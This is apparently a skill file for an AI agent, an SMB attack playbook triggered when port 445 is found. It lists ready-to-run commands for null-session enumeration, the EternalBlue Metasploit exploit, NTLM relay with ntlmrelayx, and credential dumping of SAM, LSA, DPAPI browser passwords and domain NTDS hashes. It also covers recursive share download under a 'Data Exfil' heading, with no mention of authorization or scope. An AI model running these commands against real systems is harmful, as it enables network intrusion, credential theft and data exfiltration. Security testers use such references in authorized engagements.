---
name: svc-smb
description: SMB/CIFS attack techniques — null sessions, share enumeration, NTLM relay, EternalBlue, signing checks. Use when SMB is found. Triggers - ports 445/139, netbios, MS17-010 EternalBlue, signing:False, null session, share access, PetitPotam/coerce.
---

# SMB Attack Reference

## Enumeration
```bash
# Full enumeration
enum4linux-ng -A <target>

# Share listing
smbclient -N -L //<target>
crackmapexec smb <target> --shares
crackmapexec smb <target> -u '' -p '' --shares          # null session
crackmapexec smb <target> -u 'guest' -p '' --shares     # guest

# User enumeration
crackmapexec smb <target> --users
rpcclient -U '' -N <target> -c 'enumdomusers'
rpcclient -U '' -N <target> -c 'enumdomgroups'

# SMB version / signing
crackmapexec smb <target>
nmap --script smb-security-mode -p 445 <target>
```

## Null Session Access
```bash
smbclient -N //<target>/<share>
smbmap -H <target> -u '' -p ''
rpcclient -U '' -N <target>
```

## Critical Vulnerabilities
```bash
# EternalBlue (MS17-010) — Windows 7/2008 R2/2012
nmap --script smb-vuln-ms17-010 -p 445 <target>
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target>; run"

# SMBGhost (CVE-2020-0796) — Windows 10 v1903/1909
nmap --script smb-vuln-cve-2020-0796 -p 445 <target>
```

## SMB Relay
```bash
# Check if signing is NOT required (vulnerable to relay)
crackmapexec smb <target> --gen-relay-list relay_targets.txt

# Relay with ntlmrelayx
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
# Trigger auth: responder, mitm6, or coerce
```

## Post-Auth Credential Dumping (with admin access)
```bash
# Run ALL three in order — each extracts different secrets:
netexec smb <target> -u <user> -p <pass> --sam       # local SAM hashes
netexec smb <target> -u <user> -p <pass> --lsa       # LSA secrets, cached domain creds
netexec smb <target> -u <user> -p <pass> --dpapi     # FULL DPAPI: browser passwords, vault, cookies, Credential Manager

# CRITICAL: bare --dpapi = EVERYTHING. Do NOT add subcommands (cookies/nosystem/wifi).
# Adding subcommands LIMITS output. Always use bare --dpapi first.

# On Domain Controllers:
netexec smb <dc> -u <user> -p <pass> --ntds          # ALL domain hashes

# Fallback — one-shot via impacket:
secretsdump.py <domain>/<user>:<pass>@<target>
```

## Share Access & Data Exfil
```bash
# Connect and browse
smbclient //<target>/<share> -U <user>%<password>

# Recursive download
smbget -R smb://<target>/<share> -U <user>%<password>

# Spider shares for interesting files
crackmapexec smb <target> -u <user> -p <password> --spider <share> --pattern "passw|secret|cred|key|config"
```

## Output Rules
- Always use quiet/filtered output flags. Only show successful results.
- For netexec/crackmapexec: pipe through `grep '[+]'` for brute-force runs.
- Redirect large output to files. Never paste >50 lines of raw tool output.
- Use `cme_parse` for auto-processing netexec output.
